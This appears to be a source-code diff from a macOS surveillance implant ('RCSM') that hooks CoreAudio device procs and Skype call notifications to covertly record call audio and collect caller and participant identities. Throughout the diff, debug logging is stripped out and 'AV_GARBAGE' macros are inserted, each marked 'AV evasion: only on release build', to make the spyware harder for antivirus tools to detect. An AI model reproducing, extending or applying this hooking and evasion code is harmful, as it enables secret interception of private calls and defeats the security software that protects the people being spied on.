@@ -15,6 +15,8 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
+
 static AudioDeviceID inputDeviceID  = 0;
 static AudioDeviceID outputDeviceID = 0;
 static void *inputClientData        = 0;
@@ -938,9 +940,8 @@ _hook_AudioDeviceDestroyIOProcID (AudioDeviceID       inDevice,
   //status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
   //return status;
   
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   //BOOL temp = NO;
   //[agentLock lock];
@@ -950,35 +951,52 @@ _hook_AudioDeviceDestroyIOProcID (AudioDeviceID       inDevice,
   if (gIsSkypeVoipAgentActive     == NO
       && gIsSkypeVoipAgentStopped == YES
       && inIOProcID               != gOutProcID)
-  {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
     status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
-#ifdef DEBUG_VOIP_SKYPE
-    infoLog(@"inDevice: %d", inDevice);
-    infoLog(@"inIOProcID: %p", inIOProcID);
-    infoLog(@"GENERIC: %ld", status);
-#endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     return status;
   }
   
   if (inIOProcID == gInProcID)
-  {
-#ifdef DEBUG_VOIP_SKYPE
-    infoLog(@"Destroying InputProcID");
-#endif
+  {    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     _real_AudioDeviceIOProcInput  = 0;
     inputClientData               = 0;
     gInProcID                     = 0;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
     updateFlagForStopOperation();
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
   }
   else if (inIOProcID == gOutProcID)
-  {
-#ifdef DEBUG_VOIP_SKYPE
-    infoLog(@"Destroying OutputProcID");
-#endif
+  {    
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     _real_AudioDeviceIOProcOutput = 0;
     outputClientData              = 0;
     gOutProcID                    = 0;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
+    
     updateFlagForStopOperation();
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
   }
   else
   {
@@ -987,10 +1005,13 @@ _hook_AudioDeviceDestroyIOProcID (AudioDeviceID       inDevice,
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"DESTROY: %ld", status);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   return status;
 }
@@ -1006,48 +1027,83 @@ _hook_AudioDeviceAddIOProc (AudioDeviceID       inDevice,
   OSStatus success;
   UInt32 propertySize;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (_real_AudioDeviceIOProcInput      == 0
       || _real_AudioDeviceIOProcOutput  == 0)
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       propertySize = sizeof(inputDeviceID);
       success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultInputDevice,
                                          &propertySize,
-                                         &inputDeviceID);
+                                         &inputDeviceID); 
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if (success == noErr)
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           if (inputDeviceID != kAudioDeviceUnknown)
             {
-#ifdef DEBUG_VOIP_SKYPE
-              infoLog(@"Found inputDeviceID: %lu", inputDeviceID);
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_006
+              
               if (inputDeviceID == inDevice)
-                {
-#ifdef DEBUG_VOIP_SKYPE
-                  infoLog(@"Registering original Input proc");
-#endif
+                {                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
                   _real_AudioDeviceIOProcInput = (void *)inProc;
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_005
+                  
                   inputClientData = (void *)inClientData;
                 }
               else
-                {
+                {   
+                  // AV evasion: only on release build
+                  AV_GARBAGE_001
+                
                   propertySize = sizeof(outputDeviceID);
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_008
+                  
                   success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultOutputDevice,
                                                      &propertySize,
                                                      &outputDeviceID);
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
                   if (success == noErr)
                     {
                       if (outputDeviceID != kAudioDeviceUnknown)
                         {
-#ifdef DEBUG_VOIP_SKYPE
-                          infoLog(@"Found outputDeviceID: %lu", outputDeviceID);
-#endif
+                          // AV evasion: only on release build
+                          AV_GARBAGE_003
+                          
                           if (outputDeviceID == inDevice)
                             {
-#ifdef DEBUG_VOIP_SKYPE
-                              infoLog(@"Registering original Output proc");
-#endif
+                              // AV evasion: only on release build
+                              AV_GARBAGE_006
+                              
                               _real_AudioDeviceIOProcOutput = (void *)inProc;
+                              
+                              // AV evasion: only on release build
+                              AV_GARBAGE_007
+                              
                               outputClientData = (void *)inClientData;
+                              
+                              // AV evasion: only on release build
+                              AV_GARBAGE_002     
                             }
                         }
                     }
@@ -1062,27 +1118,58 @@ _hook_AudioDeviceAddIOProc (AudioDeviceID       inDevice,
   //[agentLock unlock];
 
   if (gIsSkypeVoipAgentActive == YES)
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+    
       if (inDevice == inputDeviceID)
-        {
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+        
           success = _real_AudioDeviceAddIOProc(inDevice,
                                                _hook_AudioDeviceIOProcInput,
                                                _hook_AudioDeviceIOProcInput);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
         }
       else if (inDevice == outputDeviceID)
-        {
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+        
           success = _real_AudioDeviceAddIOProc(inDevice,
                                                _hook_AudioDeviceIOProcOutput,
                                                _hook_AudioDeviceIOProcOutput);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
         }
       else
-        {
+        { 
+        // AV evasion: only on release build
+          AV_GARBAGE_008
+        
           success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
         }
     }
   else
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+    
       success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
     }
   
   return success;
@@ -1093,9 +1180,9 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
                                AudioDeviceIOProc   inProc)
 {
   OSStatus status;
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   
   //BOOL temp = NO;
   //[agentLock lock];
@@ -1105,28 +1192,46 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
   if (gIsSkypeVoipAgentActive == YES)
     {
       if (inProc == _real_AudioDeviceIOProcInput)
-        {
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+        
           status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcInput);
-          
+        
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+        
           _real_AudioDeviceIOProcInput = 0;
           inputClientData = 0;
         }
       else if (inProc == _real_AudioDeviceIOProcOutput)
-        {
+        {         
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcOutput);
           
           _real_AudioDeviceIOProcOutput = 0;
           outputClientData = 0;
         }
       else
-        {
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+        
           status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
         }
     }
   else
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+    
       status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return status;
 }
@@ -1135,36 +1240,50 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
 @implementation myEventController
 
 - (void)handleNotificationHook: (id)arg1
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   //NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSString *name = [arg1 name];
   BOOL shouldStart = NO;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   //
   // Do this as fast as we can
   // So say we all
   //
   if ([name isEqualToString: @"CallConnecting"])
-  {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     shouldStart = VPSkypeStartAgent();
   }
   if ([name isEqualToString: @"IncomingCall"])
-  {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     shouldStart = VPSkypeStartAgent();
   }
   
-#ifdef DEBUG_VOIP_SKYPE
-  infoLog(@"arg1: %@", arg1);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [self handleNotificationHook: arg1];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   if ([[arg1 name] isEqualToString: @"CallConnecting"]   // CallTo
       || [[arg1 name] isEqualToString: @"IncomingCall"]) // IncomingCall
   {
-#ifdef DEBUG_VOIP_SKYPE
-    infoLog(@"GOT NEW CALL");
-#endif
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     //BOOL temp = NO;
     
     //[agentLock lock];
@@ -1172,10 +1291,9 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
     //[agentLock unlock];
     
     if (shouldStart == YES)
-    {
-#ifdef DEBUG_VOIP_SKYPE
-      infoLog(@"Activating Skype Hooks");
-#endif
+    {     
+      // AV evasion: only on release build
+      AV_GARBAGE_004
       
       //
       // Unfortunately from this method on we have 2 out procs registration
@@ -1195,36 +1313,52 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
       //
       // Skype 5.x
       //
-#ifdef DEBUG_VOIP_SKYPE
-      infoLog(@"Checking members for Skype 5.x");
-#endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // [arg1 object] == SKConversation object
       id conversation = [arg1 object];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       if ([conversation respondsToSelector: @selector(participants)])
       {
         NSArray *participants = [conversation performSelector: @selector(participants)];
-#ifdef DEBUG_VOIP_SKYPE
-        infoLog(@"participants: %@", participants);
-#endif
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_009
         
         int i = 0;
         NSString *peer = @"";
         if (gRemotePeerName == nil)
-        {
+        {         
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [peerLock lock];
           gRemotePeerName = [[NSMutableString alloc] init];
           [peerLock unlock];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           if ([conversation respondsToSelector: @selector(myself)])
-          {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_009
+            
             id participant = [conversation performSelector: @selector(myself)];
             if ([participant respondsToSelector: @selector(identity)])
-            {
+            { 
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
               peer = [participant performSelector: @selector(identity)];
-#ifdef DEBUG_VOIP_SKYPE
-              infoLog(@"Found myself: %@", peer);
-#endif
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002              
             }
             else
             {
@@ -1241,27 +1375,48 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
           }
           
           [peerLock lock];
-          [gRemotePeerName appendFormat: @"%@ ", peer];
+          [gRemotePeerName appendFormat: @"%@ ", peer]; 
+  
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           gLocalPeerName = [[NSMutableString alloc] initWithString: peer];
           [peerLock unlock];
         }
         
         for (; i < [participants count]; i++)
-        {
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           // Holds SKParticipant objects
           id item = [participants objectAtIndex: i];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
           if ([item respondsToSelector: @selector(identity)])
           {
             peer = [item performSelector: @selector(identity)];
             
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
             if ([peer isEqualToString: gLocalPeerName] == NO)
             {
-#ifdef DEBUG_VOIP_SKYPE
-              infoLog(@"Found peer: %@", peer);
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_006
+              
               [peerLock lock];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
+              
               [gRemotePeerName appendFormat: @"%@ ", peer];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
               [peerLock unlock];
             }
           }
@@ -1280,13 +1435,20 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
     //[agentLock lock];
     if (gIsSkypeVoipAgentActive == YES)
     {
-#ifdef DEBUG_VOIP_SKYPE
-      infoLog(@"Deactivating Skype Hooks");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       VPSkypeStopAgent();
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
     }
     //[agentLock unlock];
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   //[outerPool release];
 }
@@ -1297,24 +1459,35 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
 
 - (void)answerHook
 {
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"");
-#endif
-  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+    
   gIsSkypeVoipAgentStopped = NO;
   
-  [self answerHook];
-  [self checkActiveMembersName];
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  [self answerHook]; 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  [self checkActiveMembersName]; 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
 }
 
 - (uint)placeCallToHook: (id)arg1
 {
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"");
-#endif
-
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   gIsSkypeVoipAgentStopped = NO;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [NSThread detachNewThreadSelector: @selector(checkActiveMembersName)
                            toTarget: self
                          withObject: nil];
@@ -1323,25 +1496,40 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
 }
 
 - (void)checkActiveMembersName
-{
-#ifdef DEBUG_VOIP_SKYPE
-  infoLog(@"Checking Active Members");
-#endif
-  
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+    
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSArray *remotePeers  = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   remotePeers = [self performSelector: @selector(callMemberIdentities)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   if ([remotePeers isKindOfClass: [NSArray class]]
       && [remotePeers count] > 0)
-  {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     [peerLock lock];
     if (gRemotePeerName == nil)
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       gLocalPeerName  = [[self performSelector: @selector(hostIdentity)] copy];
       gRemotePeerName = [[NSMutableString alloc] initWithString: gLocalPeerName];
-    }
+    } 
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     int i = 0;
     for (; i < [remotePeers count]; i++)
     {
@@ -1350,18 +1538,17 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
       
       if (range.location == NSNotFound)
       {
-#ifdef DEBUG_VOIP_SKYPE
-        infoLog(@"Appending peer: %@", peer);
-#endif
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
         [gRemotePeerName appendFormat: @", %@", peer];
       }
     }
     [peerLock unlock];
     
-#ifdef DEBUG_VOIP_SKYPE
-    infoLog(@"local: %@", gLocalPeerName);
-    infoLog(@"remote: %@", gRemotePeerName);
-#endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006    
   }
   
   [outerPool release];
@@ -1369,14 +1556,17 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
 
 - (BOOL)isFinishedHook
 {
-#ifdef DEBUG_VOIP_SKYPE
-  verboseLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
 
   BOOL success = [self isFinishedHook];
 
   if (success == YES)
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+    
       updateFlagForStopOperation();
     }
 
